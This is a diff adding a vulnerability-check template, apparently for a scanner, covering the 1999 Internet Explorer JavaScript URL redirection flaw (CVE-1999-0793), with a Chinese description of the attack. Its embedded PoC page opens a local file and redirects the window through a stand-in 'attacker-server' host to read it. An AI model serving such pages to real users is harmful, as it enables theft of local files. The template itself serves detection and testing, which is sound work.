@@ -1,0 +1,40 @@
+[info]
+author = "ave"
+description = "验证 Microsoft Internet Explorer 4.0.1/5.0 JavaScript URL 重定向漏洞（CVE-1999-0793）。PoC 页面通过 JavaScript 打开 file:// 协议的本地文件窗口，然后服务器端 HTTP 302 重定向至 javascript: 伪协议，使后续 JavaScript 代码在本地安全域上下文中执行，绕过 IE 同源策略限制读取本地文件。攻击者只需诱骗用户访问该恶意网页即可触发。PoC 来源于 Georgi Guninski。"
+id = "POC-AVE-1999-0528"
+name = "Microsoft Internet Explorer JavaScript URL Redirection PoC (MS99-043)"
+severity = "low"
+tags = ["ave-1999-0528"]
+vuln_id = [
+    "CVE-1999-0793",
+    "AVE-1999-0528",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cve-1999-0793-poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = '''
+<html><body>
+<SCRIPT>
+alert("CVE-1999-0793 PoC\nCreate C:\\TEST.TXT first");
+var w = window.open("file://c:/test.txt");
+w.location = "http://attacker-server/cgi-bin/redirect.cgi?jsredir1";
+</SCRIPT>
+</body></html>'''
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "window.open",
+    "file://",
+    "jsredir1",
+]
